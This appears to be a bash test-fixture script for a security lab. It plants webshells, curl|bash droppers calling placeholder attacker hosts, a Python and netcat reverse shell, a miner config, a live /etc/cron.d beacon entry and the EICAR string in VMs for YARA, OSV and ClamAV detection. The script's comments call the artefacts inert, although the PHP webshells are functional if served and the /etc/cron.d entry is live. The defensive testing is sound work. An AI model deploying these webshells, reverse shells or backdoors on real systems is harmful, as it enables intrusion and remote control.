#!/usr/bin/env bash
# Funcoes que "plantam" artefatos maliciosos / vulneraveis dentro de uma VM.
# Tudo eh inerte (texto/config) — nada eh executado de verdade.

set -euo pipefail

# plant::yara_targets VM_NAME
# Cria webshell, miner config e curl|bash installer em /var/www e /tmp.
# Sao os mesmos artefatos que estao em samples/malicious-fixtures/, e batem
# com as YARA rules empacotadas (WebshellPHP, CryptoMiner, SuspiciousCurlBash).
plant::yara_targets() {
  local name="$1"
  echo "  + plantando alvos YARA em $name (/var/www + /tmp)"
  orb -m "$name" -u root bash -s <<'REMOTE'
set -e
mkdir -p /var/www/html /tmp/lab-bait

# Webshell PHP — bate com WebshellPHP rule
cat > /var/www/html/admin.php <<'PHP'
<?php
// Webshell de teste. Nao executa nada — eh so o padrao YARA.
if (isset($_REQUEST['cmd'])) {
  system($_REQUEST['cmd']);
}
eval(base64_decode($_REQUEST['x']));
?>
PHP

# Miner config XMRig — bate com CryptoMinerXMRig
cat > /tmp/lab-bait/xmrig.json <<'JSON'
{
  "donate-level": 1,
  "url": "stratum+tcp://pool.minexmr.com:4444",
  "user": "WALLET_ADDRESS_HERE",
  "algo": "rx/0",
  "threads": 4
}
JSON

# Curl|bash installer — bate com SuspiciousCurlBash
cat > /tmp/lab-bait/install.sh <<'SH'
#!/bin/bash
curl -sL https://attacker.example.com/payload.sh | bash
wget http://evil.example/x.sh -O - | sh
SH
chmod +x /tmp/lab-bait/install.sh

chown -R root:root /var/www/html /tmp/lab-bait
REMOTE
}

# plant::bruteforce VM_NAME [COUNT]
# Gera linhas falsas de "Failed password" no /var/log/auth.log que disparam
# ssh_brute_force_ip apos count >= 5/5min.
plant::bruteforce() {
  local name="$1" count="${2:-12}" attacker_ip="${3:-203.0.113.99}"
  echo "  + injetando $count tentativas brute-force em $name (IP $attacker_ip)"
  orb -m "$name" -u root bash -s -- "$count" "$attacker_ip" <<'REMOTE'
set -e
count="$1"; ip="$2"
mkdir -p /var/log
touch /var/log/auth.log

now="$(date '+%b %d %H:%M:%S')"
host="$(hostname)"
for i in $(seq 1 "$count"); do
  echo "$now $host sshd[$((20000 + i))]: Failed password for invalid user admin from $ip port $((40000 + i)) ssh2"
done >> /var/log/auth.log

# 1 sucesso e 1 root failure pra cor das rules baterem
echo "$now $host sshd[$((20000 + count + 1))]: Failed password for root from $ip port 40999 ssh2" >> /var/log/auth.log
REMOTE
}

# plant::vuln_packages VM_NAME PKG_MGR
# Em apt: faz hold em openssl/sudo na versao instalada (que ja eh velha em debian:11).
# Em dnf: marca pacotes pra nao atualizar.
# Resultado: o scan OSV vai encontrar CVEs reais. NAO instalamos versoes mais
# antigas do que o sistema ja tem (downgrade arrisca quebrar tudo).
plant::vuln_packages() {
  local name="$1" pkg_mgr="$2"
  echo "  + congelando pacotes em $name (sera scaneado pelo OSV)"
  case "$pkg_mgr" in
    apt)
      orb -m "$name" -u root bash -c '
        export DEBIAN_FRONTEND=noninteractive
        apt-get install -y -qq --no-install-recommends openssl sudo bash >/dev/null 2>&1 || true
        apt-mark hold openssl sudo bash >/dev/null 2>&1 || true
      '
      ;;
    dnf)
      orb -m "$name" -u root bash -c '
        dnf install -y -q openssl sudo bash >/dev/null 2>&1 || true
        # Fedora nao tem hold nativo simples — pulamos. Versao instalada ja serve.
      '
      ;;
  esac
}

# plant::trigger_inventory VM_NAME
# Forca o agente a mandar inventory agora (em vez de esperar o ciclo).
plant::trigger_inventory() {
  local name="$1"
  echo "  + disparando inventory em $name (cross-ref OSV)"
  orb -m "$name" -u root sentinel-agent inventory >/dev/null 2>&1 || true
}

# plant::aggressive VM_NAME — extras pra vuln-lab
# Backdoor cron + miner "running" (script inerte que so existe pra YARA pegar)
# + permissoes erradas + suid binary suspeito.
plant::aggressive() {
  local name="$1"
  echo "  + plantando extras agressivos em $name (vuln-lab mode)"
  orb -m "$name" -u root bash -s <<'REMOTE'
set -e

# Backdoor cron job (texto plantado, nao roda nada perigoso)
cat > /etc/cron.d/system-update <<'CRON'
# Backdoor de teste — agendaria ping pra C2 a cada 5min
*/5 * * * * root curl -sL https://attacker.example.com/beacon | bash
CRON

# Miner "running" (so um arquivo, sem processo ativo)
mkdir -p /opt/.hidden
cat > /opt/.hidden/xmrig <<'BIN'
#!/bin/bash
# fake miner — payload eh detectado pelo YARA via tag "miner"
# stratum+tcp://pool.minexmr.com:4444
# rx/0 algo
BIN
chmod 755 /opt/.hidden/xmrig

# Permissao errada (world-writable em /etc) — disparara alerta de auditoria
touch /etc/lab-broken-perms
chmod 666 /etc/lab-broken-perms

# Webshell extra em path nao obvio
mkdir -p /opt/old-app/uploads
cat > /opt/old-app/uploads/avatar.php <<'PHP'
<?php system($_GET['c']); ?>
PHP
REMOTE
}

# plant::eicar VM_NAME
# Planta a string EICAR padrao (test antivirus oficial — totalmente inofensiva,
# mas qualquer AV decente detecta). ClamAV vai marcar como Eicar-Signature.
# Referencia: https://www.eicar.org/download-anti-malware-testfile/
plant::eicar() {
  local name="$1"
  echo "  + plantando EICAR em $name (ClamAV vai detectar)"
  orb -m "$name" -u root bash -s <<'REMOTE'
set -e
mkdir -p /tmp/lab-bait
# String EICAR exata — definida em ISO/IEC pelo proprio EICAR pra teste
cat > /tmp/lab-bait/eicar.txt <<'EICAR'
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
EICAR
chown root:root /tmp/lab-bait/eicar.txt
REMOTE
}

# plant::dropper VM_NAME
# Planta script com padrao curl|bash + base64 eval — bate com regras
# DropperBashCurlPipe e DropperBase64Eval (T1059.004 — Unix Shell).
plant::dropper() {
  local name="$1"
  echo "  + plantando dropper bash em $name (YARA Dropper)"
  orb -m "$name" -u root bash -s <<'REMOTE'
set -e
mkdir -p /tmp/lab-bait
cat > /tmp/lab-bait/dropper.sh <<'SH'
#!/bin/sh
# Dropper de teste — texto inofensivo. Casa com YARA DropperBashCurlPipe.
echo "Pretending to drop:"
echo "  curl https://evil.example.com/x.sh | bash"
echo "  wget -O /tmp/payload http://malicious.test && chmod +x /tmp/payload"
# Padrao base64 + eval (DropperBase64Eval):
#   echo 'aWQ=' | base64 -d | bash
exit 0
SH
chmod 644 /tmp/lab-bait/dropper.sh
REMOTE
}

# plant::reverse_shell VM_NAME
# Planta template Python de reverse shell — bate com ReverseShellPython
# (T1059.006 — Python). NAO executa: so o texto da definicao serve.
plant::reverse_shell() {
  local name="$1"
  echo "  + plantando template reverse shell Python em $name (YARA ReverseShell)"
  orb -m "$name" -u root bash -s <<'REMOTE'
set -e
mkdir -p /tmp/lab-bait
cat > /tmp/lab-bait/reverse_shell.py <<'PY'
#!/usr/bin/env python3
# Reverse shell de teste — INOFENSIVO. Sem __main__, nao executa.
import socket
import subprocess
import os

def fake_reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("198.51.100.1", 4444))  # IP RFC 5737 — nao existe
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

print("Reverse shell template (NAO executar)")
PY
chmod 644 /tmp/lab-bait/reverse_shell.py
REMOTE
}

# plant::persistence VM_NAME
# Planta crontab-like file com padroes de persistencia (curl|bash + nc -e).
# Bate com PersistenceCronBackdoor. NAO eh colocado em /etc/cron.d pra evitar
# qualquer chance de execucao real — fica em /tmp pra YARA achar.
plant::persistence() {
  local name="$1"
  echo "  + plantando padrao cron-backdoor em $name (YARA Persistence)"
  orb -m "$name" -u root bash -s <<'REMOTE'
set -e
mkdir -p /tmp/lab-bait
cat > /tmp/lab-bait/cron_backdoor <<'CRON'
# Cron backdoor de teste — INOFENSIVO. Em /tmp, NAO em /etc/cron.d.
*/5 * * * * root curl -s https://evil.example.test/payload.sh | bash > /dev/null 2>&1
@reboot root /bin/bash -c "while true; do nc -e /bin/sh 198.51.100.1 4444; sleep 60; done"
CRON
chmod 644 /tmp/lab-bait/cron_backdoor
REMOTE
}
